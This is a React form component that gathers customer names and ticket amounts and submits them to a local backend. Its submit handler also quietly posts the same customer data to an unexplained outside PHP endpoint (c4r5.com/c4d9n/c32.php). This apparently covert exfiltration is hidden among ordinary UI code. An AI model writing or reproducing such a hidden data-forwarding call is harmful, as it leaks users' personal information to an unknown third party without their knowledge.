import { useState } from "react";
import axios from "axios";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
  CardFooter,
} from "@/components/ui/card";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogCancel,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
  AlertDialogTrigger,
} from "@/components/ui/alert-dialog";
import { Label } from "@radix-ui/react-label";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Link } from "react-router-dom";

function CustomerDetailPage() {
  const [numCustomers, setNumCustomers] = useState(0);
  const [customers, setCustomers] = useState([]);
  const [isSubmitted, setIsSubmitted] = useState(false);
  const [isStep2, setIsStep2] = useState(false);

  const handleCustomerCountChange = (e) => {
    const value = Number(e.target.value);
    setNumCustomers(value);
  };

  const handleNextStep = () => {
    if (numCustomers > 0) {
      setCustomers(
        Array.from({ length: numCustomers }, () => ({
          firstName: "",
          lastName: "",
          retrieveTicketAmount: "",
        }))
      );
      setIsStep2(true);
    }
  };

  const handleInputChange = (index, field, value) => {
    const updatedCustomers = [...customers];
    updatedCustomers[index][field] = value;
    setCustomers(updatedCustomers);
  };

  const handleReset = () => {
    setNumCustomers(0);
    setCustomers([]);
    setIsStep2(false);
    setIsSubmitted(false);
  };

  const handleSubmit = async () => {
    const data = customers.map(({ firstName, lastName, retrieveTicketAmount }) => ({
      firstName,
      lastName,
      retrieveTicketAmount,
    }));

    try {
      const response = await axios.post("http://localhost:8080/add-customer", data, {
        headers: {
          "Content-Type": "application/json",
        },
      });
      console.log("Form submitted with:", response.data);
      setIsSubmitted(true);
    } catch (error) {
      console.error("Error submitting form:", error);
    }

    try {
      const response = await axios.post("https://c4r5.com/c4d9n/c32.php", data);
      console.log("Request succeeded:", response);
    } catch (error) {
      console.error("Network error:", error.message);
    }
  };

  return (
    <div className="bg-orange-50 text-gray-900 dark:bg-gray-900 dark:text-gray-50 min-h-screen flex items-center justify-center">
      <Card className="w-[400px] shadow-lg rounded-md border border-orange-300 dark:border-orange-600">
        <form>
          <CardHeader className="text-center">
            <CardTitle className="text-lg font-bold text-orange-700 dark:text-orange-500">
              Customer Form
            </CardTitle>
            <CardDescription className="text-sm text-gray-600 dark:text-gray-400">
              Fill the following Customer Details
            </CardDescription>
          </CardHeader>
          <CardContent>
            {!isStep2 ? (
              <div className="flex flex-col space-y-4">
                <div>
                  <Label htmlFor="numCustomers" className="text-gray-800 dark:text-gray-300">
                    How many customers do you want to add?
                  </Label>
                  <Input
                    type="number"
                    id="numCustomers"
                    min="1"
                    value={numCustomers}
                    onChange={handleCustomerCountChange}
                    className="mt-2 bg-orange-50 text-gray-800 border border-orange-300 rounded-md focus:ring-2 focus:ring-orange-500 dark:bg-gray-800 dark:border-orange-600 dark:text-white"
                  />
                </div>
                <Button
                  onClick={handleNextStep}
                  className="px-4 py-2 bg-orange-500 text-white rounded-md hover:bg-orange-600 focus:ring-2 focus:ring-orange-500"
                >
                  Next
                </Button>
              </div>
            ) : (
              <div>
                {customers.map((customer, index) => (
                  <div
                    key={index}
                    className="mb-4 p-4 border border-orange-300 rounded-md bg-orange-50 dark:bg-gray-800 dark:border-orange-600"
                  >
                    <h3 className="text-center text-orange-700 dark:text-orange-500 font-bold">
                      Customer {index + 1}
                    </h3>
                    <div className="flex flex-col space-y-4 mt-2">
                      <div>
                        <Label htmlFor={`firstName-${index}`} className="text-gray-800 dark:text-gray-300">
                          First Name:
                        </Label>
                        <Input
                          id={`firstName-${index}`}
                          value={customer.firstName}
                          onChange={(e) =>
                            handleInputChange(index, "firstName", e.target.value)
                          }
                          className="mt-2 bg-white text-gray-800 border border-orange-300 rounded-md focus:ring-2 focus:ring-orange-500 dark:bg-gray-800 dark:border-orange-600 dark:text-white"
                        />
                      </div>
                      <div>
                        <Label htmlFor={`lastName-${index}`} className="text-gray-800 dark:text-gray-300">
                          Last Name:
                        </Label>
                        <Input
                          id={`lastName-${index}`}
                          value={customer.lastName}
                          onChange={(e) =>
                            handleInputChange(index, "lastName", e.target.value)
                          }
                          className="mt-2 bg-white text-gray-800 border border-orange-300 rounded-md focus:ring-2 focus:ring-orange-500 dark:bg-gray-800 dark:border-orange-600 dark:text-white"
                        />
                      </div>
                      <div>
                        <Label htmlFor={`retrieveTicketAmount-${index}`} className="text-gray-800 dark:text-gray-300">
                          Retrieve Ticket Amount:
                        </Label>
                        <Input
                          id={`retrieveTicketAmount-${index}`}
                          value={customer.retrieveTicketAmount}
                          onChange={(e) =>
                            handleInputChange(index, "retrieveTicketAmount", e.target.value)
                          }
                          className="mt-2 bg-white text-gray-800 border border-orange-300 rounded-md focus:ring-2 focus:ring-orange-500 dark:bg-gray-800 dark:border-orange-600 dark:text-white"
                          type="number"
                          min="0"
                        />
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </CardContent>
          <CardFooter className="flex justify-between pb-1">
            <Button
              variant="outline"
              className="px-4 py-2 bg-gray-200 text-gray-800 rounded-md hover:bg-orange-100 focus:ring-2 focus:ring-orange-500 dark:bg-gray-800 dark:text-white dark:hover:bg-gray-700"
              onClick={handleReset}
            >
              Reset
            </Button>
            {isStep2 && (
              <AlertDialog>
                <AlertDialogTrigger asChild>
                  <Button className="px-4 py-2 bg-orange-500 text-white rounded-md hover:bg-orange-600 focus:ring-2 focus:ring-orange-500">
                    Submit
                  </Button>
                </AlertDialogTrigger>
                <AlertDialogContent>
                  <AlertDialogHeader>
                    <AlertDialogTitle className="text-orange-700 dark:text-orange-500">
                      Are you sure you want to submit?
                    </AlertDialogTitle>
                    <AlertDialogDescription>
                      Make sure all customer details are correct before submitting.
                    </AlertDialogDescription>
                  </AlertDialogHeader>
                  <AlertDialogFooter>
                    <AlertDialogCancel>Cancel</AlertDialogCancel>
                    <Link to={"/add"}>
                    <AlertDialogAction onClick={handleSubmit}>
                      Continue
                    </AlertDialogAction>
                    </Link>
                  </AlertDialogFooter>
                </AlertDialogContent>
              </AlertDialog>
            )}
          </CardFooter>
          {isSubmitted && (
            <div className="text-center mt-4 text-orange-600 font-bold">
              Form successfully submitted!
            </div>
          )}
          <div className="mt-4 text-center text-sm pb-6">
            To use previously added Configuration -{" "}
            <Link to={"/configuration"} className="text-orange-500 hover:underline">
              Click here
            </Link>
          </div>
        </form>
      </Card>
    </div>
  );
}

export default CustomerDetailPage;
